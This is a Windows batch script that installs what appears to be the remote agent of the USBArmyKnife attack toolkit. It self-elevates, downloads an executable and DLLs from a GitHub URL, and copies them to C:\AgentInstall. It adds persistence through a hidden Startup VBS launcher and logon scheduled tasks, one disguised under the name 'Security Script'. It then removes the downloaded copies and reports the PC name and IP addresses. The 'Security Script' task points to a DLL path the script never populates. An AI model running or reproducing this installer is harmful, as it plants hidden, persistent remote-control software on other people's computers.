@echo off
setlocal EnableExtensions
title USBArmyKnife Installer

REM ============================================================
REM  USBArmyKnife Installer
REM  Downloads agent files from GitHub to the installer's
REM  directory, copies to C:\AgentInstall, sets up autostart,
REM  then deletes the downloaded files.
REM ============================================================

set "DEST=C:\AgentInstall"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
set "DIR=%~dp0"

REM --- Elevation check ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ========================================
echo   USBArmyKnife Installer
echo ========================================
echo.

REM --- 1. Stop running processes ---
echo [1/5] Stopping running processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
timeout /t 1 /nobreak >nul

REM --- 2. Download files to installer directory ---
echo [2/5] Downloading files from GitHub...

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%DIR%AgentLauncher.exe' -UseBasicParsing" 2>nul
if not exist "%DIR%AgentLauncher.exe" (
    echo    [!] FAILED to download AgentLauncher.exe
    echo    Check your internet connection.
    pause
    exit /b 1
)
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/PortableApp.dll' -OutFile '%DIR%PortableApp.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/turbojpeg.dll' -OutFile '%DIR%turbojpeg.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vcruntime140.dll' -OutFile '%DIR%vcruntime140.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/WmiLight.Native.dll' -OutFile '%DIR%WmiLight.Native.dll' -UseBasicParsing" 2>nul

echo    Downloads complete.

REM --- 3. Copy files to destination ---
echo [3/5] Installing to %DEST%...
if not exist "%DEST%" mkdir "%DEST%"

copy /y "%DIR%AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
copy /y "%DIR%PortableApp.dll" "%DEST%\PortableApp.dll" >nul
copy /y "%DIR%turbojpeg.dll" "%DEST%\turbojpeg.dll" >nul
copy /y "%DIR%vcruntime140.dll" "%DEST%\vcruntime140.dll" >nul
copy /y "%DIR%WmiLight.Native.dll" "%DEST%\WmiLight.Native.dll" >nul

REM --- 4. Set up autostart ---
echo [4/5] Setting up autostart...
if not exist "%STARTUP%" mkdir "%STARTUP%"

REM Write USBArmyKnifeAgent.vbs
powershell -NoProfile -Command "$lines = @('Set fso = CreateObject(\"Scripting.FileSystemObject\")', 'exe = \"C:\AgentInstall\AgentLauncher.exe\"', 'If fso.FileExists(exe) Then', '    CreateObject(\"WScript.Shell\").Run Chr(34) + exe + Chr(34) + \" vid=cafe pid=403f cwd=C:\AgentInstall\", 0, False', 'End If'); Set-Content -Path '%STARTUP%\USBArmyKnifeAgent.vbs' -Value ($lines -join \"`r`n\") -Encoding ASCII"

schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "USBArmyKnife Agent" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "USBArmyKnife Agent" created.
)

schtasks /query /tn "Security Script" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "Security Script" /tr "rundll32 \"%APPDATA%\PortableApp.dll\" Open32 vid=cafe pid=403f cwd=%APPDATA%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "Security Script" created.
)

REM --- 5. Start services ---
echo [5/5] Starting Agent...
start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%

REM --- Cleanup downloaded files from installer directory ---
echo.
echo Cleaning up downloaded files...
del "%DIR%AgentLauncher.exe" >nul 2>&1
del "%DIR%PortableApp.dll" >nul 2>&1
del "%DIR%turbojpeg.dll" >nul 2>&1
del "%DIR%vcruntime140.dll" >nul 2>&1
del "%DIR%WmiLight.Native.dll" >nul 2>&1

echo.
echo ========================================
echo   Installation complete!
echo ========================================
echo.
echo PC Name:   %COMPUTERNAME%
echo IP Addresses:
for /f "usebackq tokens=2 delims=:" %%i in (`ipconfig ^| findstr /r "IPv4"`) do echo     %%i
echo.
echo Window closes in 10 seconds...
timeout /t 10 /nobreak >nul
endlocal
